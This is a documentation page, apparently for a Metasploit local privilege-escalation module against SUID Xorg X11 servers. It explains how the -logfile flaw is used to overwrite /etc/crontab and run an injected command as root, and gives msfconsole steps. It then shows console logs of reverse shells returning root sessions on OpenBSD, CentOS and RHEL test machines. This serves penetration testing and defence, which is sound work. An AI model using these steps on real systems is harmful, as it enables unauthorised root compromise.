{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/local/xorg_x11_suid_server","result":{"data":{"moduleMetadataJson":{"id":"f720396a-0ed1-5d56-9be1-24906f91f230","name":"Xorg X11 Server SUID logfile Privilege Escalation","fullname":"exploit/multi/local/xorg_x11_suid_server","description":"This module attempts to gain root privileges with SUID Xorg X11 server\n        versions 1.19.0 < 1.20.3.\n\n        A permission check flaw exists for -modulepath and -logfile options when\n        starting Xorg. This allows unprivileged users that can start the server\n        the ability to elevate privileges and run arbitrary code under root\n        privileges.\n\n        This module has been tested with OpenBSD 6.3, 6.4, CentOS 7.4.1708, and\n        CentOS 7.5.1804, and RHEL 7.5. The default PAM configuration for CentOS\n        and RHEL systems requires console auth for the user's session to start\n        the Xorg server.\n\n        Cron launches the payload, so if SELinux is enforcing, exploitation\n        may still be possible, but the module will bail.\n\n        Xorg must have SUID permissions and may not start if already running.\n\n        On exploitation a crontab.old backup file will be created by Xorg.\n        This module will remove the .old file and restore crontab after\n        successful exploitation. Failed exploitation may result in a corrupted\n        crontab. On successful exploitation artifacts will be created consistant\n        with starting Xorg and running a cron.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/multi/local/xorg_x11_suid_server","documentationSlug":"/modules/documentation/exploit/multi/local/xorg_x11_suid_server","referencesSlug":"/modules/references/exploit/multi/local/xorg_x11_suid_server"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module attempts to gain root privileges using Xorg X11 server versions 1.19.0 &#x3C; 1.20.3 set as SUID.  A permission check flaw exists for -modulepath and -logfile options when starting Xorg.  This flaw allows users to write over existing files on the system.  This exploit backs up crontab and then uses -logfile to overwrite it.  A command to be run is set for the Font Path argument -fp which will be logged and ran by cron.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Xorg (commonly referred as simply X) is the most popular display server among Linux users. Its ubiquity has led to making it an ever-present requisite for GUI applications, resulting in massive adoption from most distributions.</p>\n<p>  Xorg is more restrictive to exploit under CentOS / RHEL.  The user must have console lock and SeLinux may interfere.  If Selinux is enforcing crontabs context will be changed on exploit and you will be unable to clean it.</p>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>OpenBSD 6.3</li>\n<li>OpenBSD 6.4</li>\n<li>CentOS 7.4.1708 x86_64</li>\n<li>CentOS 7.5.1084 x86_64</li>\n<li>Red Hat Enterprise Linux 7.5 x86_64</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  On CentOS/RHEL your session must have console lock.  To get a console lock you can login locally with a user.</p>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/local/xorg_x11_suid_server</code></li>\n<li>Do: Set a payload/target or use default(cmd/unix/reverse_openssl)</li>\n<li>Do: <code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [LHOST]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a new <em>root</em> session</li>\n</ol>\n<h2 id=\"advanced-options\" style=\"position:relative;\"><a href=\"#advanced-options\" aria-label=\"advanced options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Advanced Options</h2>\n<p>  <strong>Xdisplay</strong></p>\n<p>  Display to use for Xorg (default: <code class=\"language-text\">:1</code>)</p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A writable directory file system path (default: <code class=\"language-text\">/tmp</code>)</p>\n<p>  <strong>ConsoleLock</strong></p>\n<p>  Will check for console lock under linux (default: <code class=\"language-text\">true</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"openbsd\" style=\"position:relative;\"><a href=\"#openbsd\" aria-label=\"openbsd permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>OpenBSD</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/local/xorg_x11_suid_server\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; set lhost 172.30.0.2\nlhost =&gt; 172.30.0.2\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Started reverse double SSL handler on 172.30.0.2:4444\n[+] Passed all initial checks for exploit\n[*] Uploading your payload, this could take a while\n[*] Trying /etc/crontab overwrite\n[+] /etc/crontab overwrite successful\n[*] Waiting on cron to run\n[*] Waiting on cron to run\n[*] Waiting on cron to run\n[*] Waiting on cron to run\n[*] Waiting on cron to run\n[*] Waiting on cron to run\n[*] Waiting on cron to run\n[*] Waiting on cron to run\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo t2XWfcWkZHevLPS8;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: &quot;t2XWfcWkZHevLPS8\\n&quot;\n[*] Matching...\n[*] A is input...\n[*] Command shell session 2 opened (172.30.0.2:4444 -&gt; 172.30.0.99:41253) at 2018-11-12 15:06:39 -0600\n[+] Returning session after cleaning\n[+] Deleted /tmp/.session-odRjfx\n\nid\nuid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"centos-741708-x86_64\" style=\"position:relative;\"><a href=\"#centos-741708-x86_64\" aria-label=\"centos 741708 x86_64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CentOS 7.4.1708 x86_64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/local/xorg_x11_suid_server\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; set lhost 172.16.191.165\nlhost =&gt; 172.16.191.165\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; run\n\n[*] Started reverse double SSL handler on 172.16.191.188:4444 \n[*] Running additional check for Linux\n[+] Console lock for user\n[+] Selinux is not an issue\n[+] Xorg path found at /usr/bin/Xorg\n[+] Xorg binary /usr/bin/Xorg is SUID\n[+] Xorg version 1.19.3 is vulnerable\n[!] Xorg in process list\n[!] Could not get version or Xorg process possibly running, may fail\n[+] Passed all initial checks for exploit\n[*] Uploading your payload, this could take a while\n[*] Trying /etc/crontab overwrite\n[+] /etc/crontab overwrite successful\n[*] Waiting on cron to run\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo zk0jobDMxFdBxLBU;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;zk0jobDMxFdBxLBU\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 7 opened (172.16.191.188:4444 -&gt; 172.16.191.141:46318) at 2018-11-24 21:31:04 -0500\n[*] Waiting on cron to run\n[+] Returning session after cleaning\n[+] Deleted /tmp/.session-Tafw0iW0r8\n\nid\nuid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_t:s0-s0:c0.c1023\nuname -a\nLinux centos-7-1708.localdomain 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"red-hat-enterprise-linux-75-x86_64\" style=\"position:relative;\"><a href=\"#red-hat-enterprise-linux-75-x86_64\" aria-label=\"red hat enterprise linux 75 x86_64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Red Hat Enterprise Linux 7.5 x86_64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/local/xorg_x11_suid_server\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; set lhost 172.16.191.165\nlhost =&gt; 172.16.191.165\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(multi/local/xorg_x11_suid_server) &gt; run\n\n[*] Started reverse double SSL handler on 172.16.191.165:4444 \n[*] Running additional check for Linux\n[+] Console lock for user\n[+] Selinux is not an issue\n[+] Xorg path found at /usr/bin/Xorg\n[+] Xorg binary /usr/bin/Xorg is SUID\n[+] Xorg version 1.19.5 is vulnerable\n[!] Xorg in process list\n[!] Could not get version or Xorg process possibly running, may fail\n[+] Passed all initial checks for exploit\n[*] Uploading your payload, this could take a while\n[*] Trying /etc/crontab overwrite\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo EEdPp66R4es6U3WF;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[+] /etc/crontab overwrite successful. Waiting for job to run (may take a minute)...\n[*] Reading from socket B\n[*] B: &quot;EEdPp66R4es6U3WF\\n&quot;\n[*] Matching...\n[*] A is input...\n[*] Command shell session 2 opened (172.16.191.165:4444 -&gt; 172.16.191.228:44978) at 2019-04-21 06:29:04 -0400\n[+] Returning session after cleaning\n[+] Deleted /tmp/.session-aqxyug0fH\n\nid\nuid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_t:s0-s0:c0.c1023\nuname -a\nLinux red-hat-7-5-x64.local 3.10.0-862.el7.x86_64 #1 SMP Wed Mar 21 18:14:51 EDT 2018 x86_64 x86_64 x86_64 GNU/Linux\ncat /etc/redhat-release\nRed Hat Enterprise Linux Server release 7.5 (Maipo)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f720396a-0ed1-5d56-9be1-24906f91f230"}}}